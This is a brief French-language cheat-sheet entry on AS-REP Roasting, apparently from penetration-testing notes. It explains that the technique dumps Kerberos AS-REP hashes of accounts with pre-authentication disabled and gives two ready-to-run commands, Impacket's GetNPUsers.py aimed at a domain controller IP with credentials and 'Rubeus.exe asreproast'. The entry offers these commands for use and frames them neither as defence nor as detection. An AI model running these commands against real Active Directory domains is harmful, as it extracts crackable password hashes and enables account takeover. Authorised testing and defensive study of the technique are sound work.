AS-REP Roasting vide les hachages krbasrep5 des comptes d'utilisateurs pour lesquels la pré-authentification Kerberos est désactivée.

```sh
GetNPUsers.py dom.local/user:password -dc-ip 192.168.75.152 -request
```

```c
Rubeus.exe asreproast
```
